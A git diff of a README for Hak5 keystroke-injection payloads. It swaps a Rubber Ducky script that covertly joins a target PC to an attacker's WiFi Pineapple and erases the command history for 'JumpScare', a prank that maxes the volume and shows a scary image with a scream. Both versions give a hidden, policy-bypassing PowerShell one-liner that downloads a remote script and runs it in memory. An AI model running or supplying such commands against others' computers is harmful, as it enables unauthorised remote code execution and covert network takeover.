@@ -1,4 +1,4 @@
-![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/logo-170-px.png?raw=true)
+![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
 <details>
@@ -13,35 +13,31 @@
   </ol>
 </details>
 
-# RD-PineApple
+# JumpScare
 
-A script used to connect a targets PC to your wifi PineApple using the Rubber Ducky
+A script I put together to torment Call Center Scammers but can be used on your friends as well.. or Foes.
 
 ## Description
 
-This program will use the Rubber Ducky to connect target pc to your Wifi PineApples wireless access point
-It will generate an XML file that will be used to create a network profile for your Wifi PineApple. 
-Depending on your method of execution the XML file will either be manually entered into a powershell window 
-or you may use and Invoke Web-Request to download a script to add the network profile. After either the history of
-the powershell window and run box will be erased for a clean exit. 
+This script starts off using Invoke-WebRequests to download both and Image and Sound file 
+Their system volume is then turned up to the max level
+The script will be paused until a mouse movement is detected 
+At that point there desktop wallpaper will be changed to the scary image provided and the scream sound effect will be played
 
 ## Getting Started
 
 ### Dependencies
 
-* DropBox or another File Hosting service - Your Shared link for the intended file
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ### Executing program
 
-* Plug in RubberDucky
-* Either the entire script will be manually entered into the powershell window or
+* Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-* PS1 file to download is provided above
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
@@ -51,6 +47,8 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 All contributors names will be listed here
 
 I am Jakoby
+
+Arf
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -85,7 +83,7 @@ I am Jakoby
     <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
   </a>
 
-  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/RD-PineApple)
+  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/RubberDucky/Payloads/RD-JumpScare)
 </p>
 
 
@@ -97,7 +95,8 @@ I am Jakoby
 
 * [Hak5](https://hak5.org/)
 * [MG](https://github.com/OMG-MG)
-
+* [0iphor13](https://github.com/0iphor13)
+* [PhilSutter](https://github.com/PhilSutter)
 
 
 <p align="right">(<a href="#top">back to top</a>)</p>
